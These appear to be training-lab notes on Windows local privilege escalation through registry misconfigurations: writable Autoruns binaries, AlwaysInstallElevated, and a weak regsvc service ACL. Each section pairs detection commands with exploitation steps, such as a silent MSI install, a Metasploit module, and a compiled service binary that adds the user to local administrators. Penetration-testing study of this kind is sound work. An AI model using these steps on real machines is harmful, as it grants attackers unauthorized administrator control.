Registry

# Registry
**AutoRuns:**
Detection
1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
2. In Autoruns, click on the ‘Logon’ tab.
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.
or
```
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

Exploitation
1. Generate Payload
2. Place program.exe in ‘C:\Program Files\Autorun Program’.
3. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

**Always install Elevated:**
Detection
1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
2.From the output, notice that “AlwaysInstallElevated” value is 1.
3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
4.From the output, notice that “AlwaysInstallElevated” value is 1.

Exploitation
1.Generate .msi payload
2.Place ‘setup.msi’ in ‘C:\Temp’.
3.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi
4.It  is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators
or
```
use exploit/windows/local/always_install_elevated
set session
run
```

**regsvc ACL:**
Detection
Windows VM
1. Open powershell prompt and type: `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
2.  Notice that the output suggests that user belong to “NT  AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry  key.

Exploitation
On Attacker:
1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_service.c -o x.exe` (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
3. Copy the generated file x.exe, to the Windows VM.

On Target:
1. Place x.exe in ‘C:\Temp’.
2. Open command prompt at type: `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
3. In the command prompt type: sc start regsvc
4.  It is possible to confirm that the user was added to the local  administrators group by typing the following in the command prompt: net localgroup administrators


